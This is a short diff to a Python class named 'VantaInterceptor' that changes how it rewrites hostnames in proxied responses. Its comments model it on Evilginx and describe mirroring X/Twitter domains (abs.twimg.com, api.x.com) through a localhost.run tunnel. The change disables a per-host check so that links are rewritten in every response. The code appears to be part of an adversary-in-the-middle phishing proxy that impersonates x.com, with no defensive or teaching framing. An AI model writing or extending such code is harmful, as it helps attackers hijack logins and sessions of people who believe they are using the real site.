@@ -555,15 +555,12 @@ class VantaInterceptor:
                 # Check triggers_on (target hostname)
                 # We should apply if the current response is from the target host
                 # OR if we just want to replace occurrences globally in any response.
-                # Evilginx usually applies globally if triggers_on matches the current request host?
-                # Actually, Evilginx applies filters on responses from specific hosts.
-                # But here, we can just apply globally for simplicity, or check v_tgt_host.
+                # For single-domain mirroring (localhost.run), we MUST apply globally
+                # because scripts on abs.twimg.com contain links to api.x.com that need rewriting.
+                # So we DISABLE the strict triggers_on check for now.
                 tgt_host = getattr(flow, "metadata", {}).get("v_tgt_host")
-                if tgt_host and f.triggers_on not in tgt_host:
-                     # Only skip if strict matching is required.
-                     # But often we want to replace links to OTHER hosts in THIS response.
-                     # So we should NOT skip.
-                     pass
+                # if tgt_host and f.triggers_on not in tgt_host:
+                #      pass 
 
                 # Prepare replacement
                 target_hostname = f"{f.orig_sub}.{f.domain}"
